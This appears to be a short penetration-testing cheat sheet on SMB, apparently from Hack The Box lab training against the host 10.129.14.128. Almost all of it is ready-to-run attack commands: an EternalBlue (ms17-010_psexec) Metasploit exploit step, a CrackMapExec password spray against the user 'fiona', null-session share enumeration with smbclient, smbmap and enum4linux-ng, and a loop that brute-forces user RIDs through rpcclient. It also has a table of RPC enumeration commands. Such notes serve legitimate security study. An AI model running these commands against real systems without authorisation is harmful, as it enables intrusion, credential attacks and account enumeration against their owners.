# SMB

{% code title="FootPrinting SMB" %}
```shell-session
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
{% endcode %}

```
msfconsole

search eternal

ms17-010_psexec (set lhost and rhost) > RUN
```

```shell-session
smbclient //10.129.14.128/notes
```

```shell-session
smbclient -N -L //10.129.14.128
```

{% code title="SMB MAP" %}
```
smbmap -H 10.129.14.128
```
{% endcode %}

```
sudo cme smb STMIP -u fiona -p passwords.txt
```

<pre data-title="CrackMapExec"><code><strong>crackmapexec smb 10.129.14.128 --shares -u '' -p ''
</strong></code></pre>

{% code title="Impacket - Samrdump.py" %}
```
samrdump.py 10.129.14.128
```
{% endcode %}

{% code title="Enum4Linux" %}
```bash
TCrypt@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
TCrypt@htb[/htb]$ cd enum4linux-ng
TCrypt@htb[/htb]$ pip3 install -r requirements.txt

TCrypt@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A
```
{% endcode %}

{% code title="Brute Forcing User RIDs" %}
```
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
{% endcode %}

{% code title="Connect with RPC" %}
```
rpcclient -U "" 10.129.14.128
```
{% endcode %}

## RPC Commands

| `srvinfo`                 | Server information.                                                |
| ------------------------- | ------------------------------------------------------------------ |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |
